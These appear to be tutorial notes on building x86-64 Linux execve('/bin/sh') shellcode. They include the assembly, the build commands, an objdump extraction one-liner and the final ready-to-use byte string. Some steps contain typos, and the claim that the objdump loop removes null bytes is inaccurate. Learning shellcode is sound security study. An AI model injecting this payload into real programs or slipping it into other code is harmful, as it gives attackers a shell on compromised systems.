# Shellcode

## Logistics

1. we need to call 

```c
execve("/bin/sh", ["/bin/sh"], null)
```

2. the address of the first 3 arguments of `execve` are stored at `rdi`, `rsi`, `rdx`.

3. to load null pointer into `rdx`, we should do

```assembly
xor rdx rdx
push rdx
```

4. to push the "/bin/sh" argument to stack, we need

```assembly
mov rax, <little-endian representation of the "/bin/sh" string>
push rax
```

5. to load into `rdi` the stack pointer (now points to "/bin/sh"), we do

```assembly
move rdi, rsp
```

6. to push the array `["/bin/sh"]` onto stack with a null pointer indicating its end, we do

```assembly
push rdx
push rdi
``` 

7. to load the above (pointed by rsp now) address into `rsi`, we do

```assembly
mov rsi, rsp
```

8. now we need to load 59 into the least significant byte of `rax`, before that we should tidy up.

```assembly
xor rax rax
mov al 0x3b
```

## Assembly code

```assembly
; runs /bin/sh

section .text
    global _start

_start:

    xor rdx, rdx
    push rdx
    mov rax, <little endian of "/bin/sh">
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    xor rax, rax
    mov al, 0x3b
    syscall
```

By playing with convert.py, we know that the "/bin//sh" little endian presentation should be `0x68732f2f6e69622f`.

Now we can compile it: 

```bash
nasm -f elf64 example.asm -o example.o
```

Use GNU linker (ld), we could combine the compiled object file with symbol references.

```bash
ld -m elf_x86_64 -s -o example example.o
```

## Make shellcode

Run 

```bash
for i in $(objdump -d example |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
```

to remove null bytes in the objdump output.

We get out final shellcode

```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
```.